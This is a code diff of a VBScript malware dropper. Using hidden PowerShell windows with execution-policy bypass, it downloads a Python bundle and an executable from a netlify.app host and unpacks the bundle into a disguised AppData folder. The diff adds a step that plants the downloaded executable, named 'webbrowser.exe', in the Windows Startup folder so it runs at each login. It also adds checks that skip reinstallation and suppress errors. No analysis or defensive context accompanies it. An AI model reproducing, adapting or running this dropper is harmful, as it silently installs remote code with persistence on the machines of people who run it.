@@ -1,28 +1,34 @@
 Set WshShell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-
+' hexa BroMaker.
 tempZip = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\p.zip"
 appDir = WshShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Application"
 startupDir = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
+exePath = startupDir & "\webbrowser.exe"
+pythonExe = appDir & "\python\python.exe"
+pyScript = appDir & "\Alpela.py"
 
-' 1. إنشاء مجلد Application
-If Not fso.FolderExists(appDir) Then fso.CreateFolder(appDir)
+If fso.FileExists(pyScript) Then
+    WScript.Quit
+End If
 
-' 2. تنزيل python.zip
-WshShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'http://velvety-pasca-0eb72c.netlify.app/python.zip' -OutFile '" & tempZip & "'""", 0, True
+If Not fso.FolderExists(appDir) Then
+    On Error Resume Next
+    fso.CreateFolder(appDir)
+    On Error GoTo 0
+End If
 
-' 3. فك الضغط فـ Application
-WshShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Expand-Archive -Path '" & tempZip & "' -DestinationPath '" & appDir & "' -Force""", 0, True
+WshShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://velvety-pasca-0eb72c.netlify.app/python.zip' -OutFile '" & tempZip & "'""", 0, True
 
-' 4. حذف الملف المؤقت
-If fso.FileExists(tempZip) Then fso.DeleteFile tempZip, True
+If fso.FileExists(tempZip) Then
+    WshShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""Expand-Archive -Path '" & tempZip & "' -DestinationPath '" & appDir & "' -Force""", 0, True
+    On Error Resume Next
+    fso.DeleteFile tempZip, True
+    On Error GoTo 0
+End If
 
-' 5. كتابة start.vbs فـ Startup
-vbsContent = "Set WshShell = CreateObject(""WScript.Shell"")" & vbCrLf & _
-             "WshShell.CurrentDirectory = """ & appDir & """" & vbCrLf & _
-             "WshShell.Run """"" & appDir & "\python\python.exe"" ""Alpela.py"""""", 0, False"
+If Not fso.FileExists(exePath) Then
+    WshShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://velvety-pasca-0eb72c.netlify.app/webbrowser.exe' -OutFile '" & exePath & "'""", 0, True
+End If
 
-Dim f
-Set f = fso.CreateTextFile(startupDir & "\start.vbs", True)
-f.Write vbsContent
-f.Close
+WScript.Quit
